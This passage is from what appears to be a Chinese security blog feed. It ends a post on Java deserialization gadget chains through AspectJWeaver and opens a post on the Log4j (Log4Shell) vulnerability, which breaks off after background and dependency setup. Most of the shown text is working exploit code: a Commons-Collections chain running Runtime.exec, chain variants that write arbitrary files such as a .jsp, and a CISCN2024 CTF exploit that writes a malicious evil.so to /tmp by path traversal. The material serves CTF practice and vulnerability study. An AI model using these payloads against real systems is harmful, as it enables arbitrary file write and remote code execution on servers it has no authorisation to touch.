class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:/&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cache.idx&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        writeFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (Map) constructor.newInstance(path, <span class="hljs-number">6000000</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> FactoryTransformer.getInstance(ConstantFactory.getInstance(CC6()));<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, fileName);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        setValue(val, <span class="hljs-string">&quot;val&quot;</span>, entry);<br>        ser(val);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        objectOutputStream.writeObject(o);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] CC6() <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;b&quot;</span>);<br><br>        setValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="CC5改链"><a href="#CC5改链" class="headerlink" title="CC5改链"></a>CC5改链</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AJCC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 反射获取构造函数</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>).getDeclaredConstructor(String.class,<span class="hljs-type">int</span>.class);<br>        con.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 实例化对象</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (HashMap)con.newInstance(<span class="hljs-string">&quot;C:&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 这里用到ConstantTransformer是为了构造value，即写入文件的值</span><br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-comment">// 返回一个LazyMap对象</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outmap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map,transform);<br>        <span class="hljs-comment">// 利用TiedMapEntry和BadAttributeValueExpException，使反序列化BadAttributeValueExpException对象的时候触发LazyMap的get方法</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outmap,<span class="hljs-string">&quot;Users\\75279\\Desktop\\1.jsp&quot;</span>);<br>        <span class="hljs-comment">// 这里是为了序列化时不触发LazyMap的get方法</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(poc,tiedmap);<br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(out);<br>        oos.writeObject(poc);<br>        System.out.println(Base64.getEncoder().encodeToString(out.toByteArray()));<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(out.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="CC6改链"><a href="#CC6改链" class="headerlink" title="CC6改链"></a>CC6改链</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AJCC6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 反射获取构造函数</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>).getDeclaredConstructor(String.class,<span class="hljs-type">int</span>.class);<br>        con.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 实例化对象</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (HashMap)con.newInstance(<span class="hljs-string">&quot;C:&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 这里用到ConstantTransformer是为了构造value，即写入文件的值</span><br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-comment">// 返回一个LazyMap对象</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outmap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map,transform);<br>        <span class="hljs-comment">// 利用TiedMapEntry和BadAttributeValueExpException，使反序列化BadAttributeValueExpException对象的时候触发LazyMap的get方法</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outmap,<span class="hljs-string">&quot;Users\\75279\\Desktop\\1.jsp&quot;</span>);<br>        <span class="hljs-comment">// 这里是为了序列化时不触发LazyMap的get方法</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedmap, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(out);<br>        oos.writeObject(expMap);<br>        System.out.println(Base64.getEncoder().encodeToString(out.toByteArray()));<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(out.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/09/AspectJWeaver/image-20240809210524825.png" alt="image-20240809210524825"></p><p>最后补充一下国赛那道题用的<code>AspectJWeaver</code>写入恶意so文件的EXP，完整初赛wp可见<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18201664">CISCN2024-WEB-wp - Eddie_Murphy - 博客园 (cnblogs.com)</a>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.example.jdbctest.bean.UserBean;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-comment">// 获取指定类的第一个构造函数，并设置为可访问</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Constructor&lt;?&gt; getCtor(<span class="hljs-keyword">final</span> String name) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ctor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> ctor;<br>    &#125;<br><br>    <span class="hljs-comment">// 创建一个UserBean对象，将evil.so的内容Base64编码后存入UserBean中</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;../../../../../../../../../../../../tmp/evil.so&quot;</span>; <span class="hljs-comment">// 路径指向/tmp/evil.so</span><br>        <span class="hljs-type">Path</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">&quot;F:\\CTF_Java\\CISCN2024\\src\\main\\java\\com\\eddiemurphy\\evil.so&quot;</span>); <span class="hljs-comment">// 假设evil.so位于当前目录</span><br>        <span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(filePath); <span class="hljs-comment">// 读取文件字节</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(fileBytes); <span class="hljs-comment">// 将文件内容Base64编码</span><br>        <span class="hljs-type">UserBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserBean</span>(filename, content); <span class="hljs-comment">// 创建UserBean实例</span><br>        Constructor&lt;?&gt; ctor = getCtor(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">simpleCache</span> <span class="hljs-operator">=</span> ctor.newInstance(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-number">12</span>); <span class="hljs-comment">// 实例化一个SimpleCache对象</span><br>        bean.setObj(simpleCache); <span class="hljs-comment">// 将SimpleCache对象设置为UserBean的obj属性</span><br>        <span class="hljs-keyword">return</span> bean;<br>    &#125;<br><br>    <span class="hljs-comment">// 序列化一个对象到字节数组</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object object) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(object);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-comment">// 主函数，序列化对象并将其写入文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] serialized = serialize(getObject()); <span class="hljs-comment">// 序列化对象</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;F:\\CTF_Java\\CISCN2024\\src\\main\\java\\com\\eddiemurphy\\output.ser&quot;</span>; <span class="hljs-comment">// 输出文件名</span><br><br>        <span class="hljs-comment">// 使用FileOutputStream将字节数据写入文件</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fileName);<br>        fos.write(serialized);<br>        fos.close(); <span class="hljs-comment">// 关闭文件输出流</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/aspectjweaver">AspectJWeaver | Java (gitbook.io)</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136595841">【Web】浅聊Java反序列化之AspectJWeaver——任意文件写入-CSDN博客</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4j</title>
    <link href="/2024/08/08/Log4j/"/>
    <url>/2024/08/08/Log4j/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Log4j漏洞被称为可载入史册的里程碑式顶级供应链漏洞。</p><p>2021年底，Log4j 漏洞横空出世，在安全圈引起了轩然大波，可以说是核弹级别的漏洞，无论是渗透、研发、安服、研究，所有人都在学习和复现这个漏洞，由于其覆盖面广，引用次数庞大，直接成为可以与永恒之蓝齐名的顶级可利用漏洞，官方 CVSS 评分更是直接顶到 10.0，国内有厂商将其命名为“毒日志”，国外将其命名为 Log4Shell。</p><p>Apache log4j2是一款用于 Java 日志记录的工具。日志记录主要用来监视代码中变量的变化情况，周期性地记录到文件中供其他应用进行统计分析工作；跟踪代码运行时轨迹，作为日后审计的依据；担当集成开发环境中的调试器的作用，向文件或控制台打印代码的调试信息。其在JAVA生态环境中应用极其广泛,影响巨大。</p><p>漏洞的触发点在于利用<code>org.apache.logging.log4j.Logger</code>进行<code>log</code>或<code>error</code>等记录操作时未对日志message信息进行有效检查，从而导致漏洞发生，触发点是JNDI。</p><p>影响版本：<code>2.0 &lt;= Apache log4j2 &lt;= 2.14.1</code></p><h2 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h2><p>Add the dependencies listed below to your classpath.</p><blockquote><p>log4j-api.jar</p><p>log4j-core.jar</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> 